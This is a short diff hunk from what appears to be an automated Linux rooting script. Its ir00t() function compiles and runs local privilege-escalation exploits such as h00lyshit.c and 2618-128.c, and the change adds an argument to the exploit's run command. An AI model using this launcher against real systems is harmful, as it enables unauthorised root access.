@@ -93,7 +93,7 @@ def ir00t():
 			comph = "gcc " + "h00lyshit.c" + " -o" + "h00lyshit"
 			os.system(comph)
 			os.system("chmod +x h00lyshit")
-			os.system("./h00lyshit")
+			os.system("./h00lyshit h00lyshit-dummy.file")
 		elif exp == "2618-128.c":
 			comph = "gcc -Wall -o 2618-128 " + "2618-128.c"
 			os.system(comph)
